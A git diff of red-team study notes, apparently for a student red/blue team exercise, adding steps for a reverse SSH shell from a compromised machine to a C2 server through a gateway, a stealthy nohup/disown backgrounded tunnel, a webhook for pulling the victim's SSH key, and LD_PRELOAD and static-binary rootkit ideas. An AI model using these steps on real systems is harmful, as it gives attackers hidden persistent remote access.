@@ -35,6 +35,24 @@ TODO: A rootkit is ...
 
 ### 1.2 Reverse SSH Shells Info
 
+- Must generate a public/private SSH key pair on the pwned machine, register the pwned machine's public key as an authorized key:
+
+On pwned machine:
+
+- `ssh-keygen -t rsa`
+- `cat ~/.ssh/id_rsa.pub`
+
+On C2:
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCldGAsIsvBDNn0bf2z7Z+8gecjyeM/z0HpEkWLZQv+NOrOZQa6L2En0E1bgytRECWMSf912FwfosC4QGrbuNMn49DFLGEabBABzpbMPyibZkKTB4nqLcN3sFhyVVUzkrecQd8G+QlbdxsbvwbnIOkEKBQVDnxoM05N9Jj/vJi+BpxjjtJeE6n8ylkFUcr/R4yLG+mXNBkt7s8imb0nGQn3xWl/6D+WGSSs31U+wm6pd8tWWsMKIOmSOaUTzdsqxTCTKfk1VcTcx2mQhXYDrhoLkbnFQB8+QdIIIPRSApAtRaJiCmFOmhkJJCKuQzlA6YdtMIl7cOyO5P48CvAsQMTZjlYWGbPMx/s3wa/WRFSj+GvogSBCrNQiecNI4ihadCvunqiSbwrypeQL1XRYA8At6YbKCCZSIRvmx5iRzgX947sf/jLLIDQx4Wa/J1tAOamkYjJ1v+nS6MWspH5D4TAcCBTDEsH/psp5T3+GCI/bwiM53e4D5gbkXjr2BGWLYV8= asritha@asritha
+
+- `vim ~/.ssh/authorized_keys`, pasted key
+- `chmod 700 ~/.ssh`
+- `chmod 600 ~/.ssh/authorized_keys`
+- open port 7070
+
+https://testsssh.free.beeceptor.com - to get the SSH key from the pwned server
+
 - https://moreillon.medium.com/ssh-reverse-shells-5094d9be2094
 
 C2 IP: `192.168.1.3`
@@ -48,9 +66,13 @@ Server IP: `192.168.1.2`
     - `-R`: remote port forwarding; forward any traffic recieved on the C2 at `7070` to the server's SSH daemon (port 22)
       - `localhost:7070` means the tunnel binds to `localhost` on the C2 itself (so only processes on `192.168.1.3` itself can connect to port `7070` to reach port `20` on pwned-server.
   - 2. from C2: `ssh -p 7070 localhost`
+
 - reverse SSH shell using GCP VM as gateway server:
-  - 1. initiated from pwned-server: `ssh -R 0.0.0.0:7070:localhost:22 192.168.1.4`
+  - 1. initiated from pwned-server:
+       `nohup ssh -R 0.0.0.0:7070:localhost:22 umassredblueteam@192.168.1.4 > /dev/null 2>&1 &` TODO: figure out how nohup actually works + `/dev/null` - this command should make both output streams + error streams from the reverse shell disappear
+       - apparently can also do this to "disown it" so it doesn't show up in the shell's job table `nohup <xxx> > /dev/null 2&1 & disown` TODO: idk what this means, do we want to do this?
     - `0.0.0.0:7070` means the tunnel binds to `0.0.0.0` on the C2 (all network interfaces), so any machine can reach `192.168.1.4` can connect and will be forwarded to pwned-server at port `22`
+
   - 2. edit gateway's SSH server `/etc/ssh/sshd_config` file
   - 3. from C2: ssh through gateway onto pwned-VM: `ssh -p 7070 192.168.1.4`
 
@@ -106,6 +128,9 @@ Broadly, the `coreutils` package covers three major areas:
 ##### 2.1.1.2 Defending
 
 #### 2.1.2 `LD_PRELOAD`
+
+- can misuse `LD_LIBRARY_PATH`
+- can modify LD_PRELOAD? (env or actual file?)
 
 ##### 2.1.2.1 Prerequisites
 
@@ -319,6 +344,8 @@ int puts(const char *message) {
 
 - linux system almost entirely dynamically linked, but there will still be some statically linked programs
 - so could statically compile binaries (ex. use `busybox` static binaries) - `busybox ls -la` (TODO: look into this)
+
+- from Om: sign everything yourself and then enroll key into UEFI if it doesnt support secure boot (like Arch) -> learn more about this stuff im confuzzled
 
 ---
 
